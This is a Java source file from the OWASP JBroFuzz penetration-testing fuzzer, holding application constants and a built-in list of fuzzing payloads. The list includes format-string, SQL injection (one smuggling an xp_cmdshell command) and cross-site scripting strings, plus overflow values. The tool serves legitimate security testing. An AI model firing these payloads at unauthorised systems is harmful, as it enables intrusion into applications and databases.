/**
 * Format.java 0.5
 *
 * Java Bro Fuzzer. A stateless network protocol fuzzer for penetration tests.
 * It allows for the identification of certain classes of security bugs, by
 * means of creating malformed data and having the network protocol in question
 * consume the data.
 *
 * Copyright (C) 2007 subere (at) uncon . org
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA  02110-1301, USA.
 */
package org.owasp.jbrofuzz.ver;

import java.text.*;
import java.util.*;

import javax.swing.*;

import org.owasp.jbrofuzz.*;
/**
 * <p>Class responsible for holding the description of a number of static
 * parameters and constants relating to the application.</p>
 * <p>Typical parameters found in this class include the file names for
 * the generators and the directories list, user properties.</p>
 *
 * @author subere (at) uncon . org
 * @version 0.5
 */
public class Format {

  /**
   * The generators file name, expected to be read from within the directory
   * from which JBroFuzz gets launched.
   */
  public static final String FILE_GEN = "jbrofuzz-generators";

  /**
   * The directories file name, expected to be read from within the directory
   * from which JBroFuzz gets launched.
   */
  public static final String FILE_DIR = "jbrofuzz-directories";

  /**
   * <p>The system info providing console information and potentially useful
   * for debugging under different JVMs.</p>
   *
   * @since 0.1
   */
  public static final String SYSTEM_INFO = "Vendor:  " +
                                           System.getProperty("java.vendor") +
                                           "\r\n" + "Version: " +
                                           System.getProperty("java.version") +
                                           "\r\n" + "Installed at: " +
                                           System.getProperty("java.home") +
                                           "\r\n" + "Website: " +
                                           System.getProperty("java.vendor.url") +
                                           "\r\n" + "User: " +
                                           System.getProperty("user.name") +
                                           "\r\n" + "Home $: " +
                                           System.getProperty("user.home") +
                                           "\r\n" + "Current $: " +
                                           System.getProperty("user.dir") +
                                           "\r\n" + "O/S: " +
                                           System.getProperty("os.name") +
                                           "\r\n" + "Version: " +
                                           System.getProperty("os.version") +
                                           "\r\n" + "Architecture: " +
                                           System.getProperty("os.arch") +
                                           "\r\n";

  /**
   * <p> The list of directories used if a file is not found to load the
   * directories from.</p>
   */
  public static final String DEFAULT_DIRECTORIES =
    "images\n" +
    ".svn\n" +
    "fuzz\n" +
    "rss\n" +
    "live\n";

  /**
   * <p>The list of generators used if a file is not found to load the generators
   * from.</p>
   */
  public static final String DEFAULT_GENERATORS =
    "# JBroFuzz Generator Definitions for version 0.3\n" + "#\n" + "# -----------------------------------------------------------------------------\n" +
    "# A bit of (fuzzing) theory \n" + "# -----------------------------------------------------------------------------\n" +
    "#\n" +
    "# In the current version, there are two categories of generators. These are:\n" +
    "# \n" + "# -> Recursive Generators (R)\n" + "#\n" + "# Recursive generators iterate through all combinations of a set alphabet for \n" + "# a given length. An example of this is a HEX generator. This will attempt all \n" + "# possible HEX requests for any given length. For example, if the length was, \n" + "# say, 5 characters then a recursive generator would attempt all combinations \n" +
    "# from 00000 to fffff.\n" + "#\n" + "# -> Replasive Generators (P)\n" +
    "#\n" +
    "# Replasive generators substitute the selected range with the value given \n" +
    "# from a given value list. An example of this is a XSS generator. This will\n" +
    "# attempt to check against Cross Site Scripting attacks by substituting a \n" +
    "# particular part of the request against the given value list. \n" + "#\n" + "# -----------------------------------------------------------------------------\n" +
    "# What JBroFuzz-0.3 supports (what you change in this file and will work)\n" + "# -----------------------------------------------------------------------------\n" +
    "#\n" + "# This version supports the alteration/addition of replasive generators as seen \n" +
    "# below.\n" + "# \n" +
    "# Next versions will also support adding recursive generators to this file.\n" +
    "#\n" + "# -----------------------------------------------------------------------------\n" +
    "# Adding a new generator (yes, you can brake JBroFuzz if you fuzz this file)\n" + "# -----------------------------------------------------------------------------\n" +
    "#\n" +
    "# This file is loaded at runtime. To add a replasive generator follow the \n" +
    "# syntax seen below:\n" + "#\n" + "# P:XXX:(comment < 25 chars):SIZE\n" +
    "# > Category (essentially a comment field)\n" + "# VALUE(1)\n" +
    "# VALUE(2)\n" + "# ...\n" + "# VALUE(SIZE)\n" + "#\n" + "# Pre:\n" +
    "# First line must have 4 fields divided by \":\"\n" +
    "# First character must be \"P\" for replasive\n" +
    "# XXX has to be unique and 3 letters long\n" +
    "# Comment has to be less than 24 characters\n" +
    "# SIZE has to be between [0-32]\n" +
    "# SIZE must match the total number of lines below the generator\n" +
    "# Second line (describing the category) must start with \">\"\n" + "#\n" + "# -----------------------------------------------------------------------------\n" +
    "# Alphabet String Expansion (so that you don't get bored of pasting)\n" + "# -----------------------------------------------------------------------------\n" +
    "#\n" +
    "# A value line starting with \"f(x)=\" will be expanded provided it has the \n" +
    "# character \" x \" between a String and a positive integer. \n" + "#\n" +
    "# Here is an example:\n" + "#\n" + "# f(x)=A x 100 \n" + "# \n" +
    "# Will produce a line of 100 A's\n" + "#\n" + "# -----------------------------------------------------------------------------\n" +
    "# What JBroFuzz-0.3 does not support (file changes that will NOT work)\n" + "# -----------------------------------------------------------------------------\n" +
    "#\n" + "# This version does not support the addition/alteration\n" +
    "# of recursive generators (starting with R)\n" + "#\n" +
    "# Copyright (C) 2006 subere (at) uncon org\n" + "# Version 0.3\n" + "#\n" +
    "\n" + "P:INT:Integer Overflows:12\n" + "> Exploits | Integer values \n" +
    "-1\n" + "0\n" + "0x100\n" + "0x1000\n" + "0x3fffffff\n" + "0x7ffffffe\n" +
    "0x7fffffff\n" + "0x80000000\n" + "0xfffffffe\n" + "0xffffffff\n" +
    "0x10000\n" + "0x100000\n" + "\n" + "P:FSE:Format String Errors:19\n" +
    "> Exploits | Format String Errors\n" + "%s%p%x%d\n" + ".1024d\n" +
    "%.2049d\n" + "%p%p%p%p\n" + "%x%x%x%x\n" + "%d%d%d%d\n" + "%s%s%s%s\n" +
    "%99999999999s\n" + "%08x\n" + "%%20d\n" + "%%20n\n" + "%%20x\n" +
    "%%20s\n" + "%s%s%s%s%s%s%s%s%s%s\n" + "%p%p%p%p%p%p%p%p%p%p\n" +
    "%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%\n" +
    "f(x)=%s x 123\n" + "f(x)=%x x 255\n" + "\n" + "P:SQL:SQL Injection:12\n" +
    "> Database | Injection Attacks\n" + "a'\n" + "?\n" + "' or 1=1\n" +
    "‘ or 1=1 --\n" + "x' AND userid IS NULL; --\n" +
    "x' AND email IS NULL; --\n" + "anything' OR 'x'='x\n" +
    "x' AND 1=(SELECT COUNT(*) FROM tabname); --\n" +
    "x' AND members.email IS NULL; --\n" + "x' OR full_name LIKE '%Bob%\n" +
    "23 OR 1=1\n" + "'; exec master..xp_cmdshell 'ping 172.10.1.255'--\n" +
    "\n" + "P:XSS:Cross Site Scripting:12\n" + "> Cross Site Scripting\n" +
    "<IMG SRC=javascript:alert('XSS')>\n" +
    "<IMG SRC=JaVaScRiPt:alert('XSS')>\n" +
    "<IMG SRC=`javascript:alert(\"XSS says, 'XSS'\")`>\n" +
    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">\",\n" +
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n" + "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\n" + "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n" +
    "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">\n" +
    "Perl -e 'print \"<SCR\\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out\n" +
    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n" +
    "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>\n" +
    "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\n" + "\n" +
    "R:HEX:Hexadecimal Fuzz Type:16\n" +
    "> Category String | Characters | Hex\n" + "0\n" + "1\n" + "2\n" + "3\n" +
    "4\n" + "5\n" + "6\n" + "7\n" + "8\n" + "9\n" + "a\n" + "b\n" + "c\n" +
    "d\n" + "e\n" + "f\n" + "\n" + "R:DEC:Decimal Fuzz Type:10\n" +
    "> Category String | Characters | Dec\n" + "0\n" + "1\n" + "2\n" + "3\n" +
    "4\n" + "5\n" + "6\n" + "7\n" + "8\n" + "9\n" + "\n" +
    "R:OCT:Octal Fuzz Type:8\n" + "> Category String | Characters | Octal\n" +
    "0\n" + "1\n" + "2\n" + "3\n" + "4\n" + "5\n" + "6\n" + "7\n" + "\n" +
    "R:BIN:Binary Fuzz Type:2\n" + "> Category String | Characters | Binary\n" +
    "0\n" + "1\n" + "\n" + "P:BFO:Buffer Overflows:17\n" +
    "> Exploits | Buffer overflows\n" + "A\n" + "f(x)=A x 3\n" + "f(x)=A x 5\n" +
    "f(x)=A x 9\n" + "f(x)=A x 17\n" + "f(x)=A x 33\n" + "f(x)=A x 65\n" +
    "f(x)=A x 129\n" + "f(x)=A x 257\n" + "f(x)=A x 513\n" + "f(x)=A x 1025\n" +
    "f(x)=A x 2049\n" + "f(x)=A x 4197\n" + "f(x)=A x 8193\n" +
    "f(x)=A x 16385\n" + "f(x)=A x 32769\n" + "f(x)=A x 65537\n" + "\n";

  /**
   * <p>Each version of JBroFuzz has a codename, which is defined by this public
   * variable.</p>
   */
  public static final String CODENAME = "Pluto "; /* - God of Death */

  /**
   * <p>The version of JBroFuzz in String format and always of the form "x.x"
   * where 'x' is a single digit in the range of [0-9].</p>
   */
  public static final String VERSION = "0.5";

  /**
   * <p>The text shown in the about box.</p>
   */
  public static final String ABOUTTEXT = "Java Bro Fuzzer Version:  " + VERSION +
                                         "\n" + "Codename:  " + CODENAME +
                                         "\n\n" +
                                         "JBroFuzz comes with ABSOLUTELY NO WARRANTY. This is free software\n" +
                                         "and you are welcome to redistribute it under the GNU GPL license\n\n" +
                                         "Copyright (c) 2007  subere (at) uncon org\n\n" +
                                         "Running Under  Java " +
                                         System.getProperty("java.version") +
                                         "\n";

  /**
   * <p>The text shown in the disclaimer box.</p>
   */
  public static final String DISCLAIMER =
    "You should only use this software to test the security of\n" +
    "your own network protocol application or those you are\n" +
    "authorised to do so. The authors of JBroFuzz take no\n" +
    "legal or other responsibility for any problems that\n" +
    "might occur while running JBroFuzz on a\n" +
    "particular application or network protocol.\n";

  //
  // Variables used to define the current date as reference
  //
  private static final String DATE_FORMAT = "DDD yyyy-MM-dd HH-mm-ss";
  private static final String ISO_LAN_CODE = "en";
  private static final SimpleDateFormat SDF = new SimpleDateFormat(DATE_FORMAT,
    new Locale(ISO_LAN_CODE));
  /**
   * Formatting the date in ISO8601 standard format.
   */
  public static final String DATE = SDF.format(new Date());
  /**
   * <p>Method for setting the UI Look and Feel based on the operating system.
   * In the current version the only distinction that is being made is between
   * win32 o/s and all other.</p>
   *
   * @param mJBroFuzz JBroFuzz
   */
  public static final void setLookAndFeel(JBroFuzz mJBroFuzz) {
    try {
      String os = System.getProperty("os.name");
      os = os.toLowerCase();
      if (os.startsWith("windows")) {
        UIManager.setLookAndFeel(
          "com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
      }
    }
    catch (UnsupportedLookAndFeelException e) {
      mJBroFuzz.getFrameWindow().log(
        "An unsupported look and feel exception was thrown while setting the " +
        "User Interface Manager");
    }
    catch (ClassNotFoundException e) {
      mJBroFuzz.getFrameWindow().log(
        "A class not found exception was thrown while setting the " +
        "User Interface Manager");
    }
    catch (InstantiationException e) {
      mJBroFuzz.getFrameWindow().log(
        "An instantiation exception was thrown while setting the User " +
        "Interface Manager");
    }
    catch (IllegalAccessException e) {
      mJBroFuzz.getFrameWindow().log(
        "An illegal access exception was " +
        "thrown while setting the User Interface Manager");
    }
    catch (SecurityException e) {
      mJBroFuzz.getFrameWindow().log(
        "A security exception was thrown while setting the User " +
        "Interface Manager");
    }
  }
}
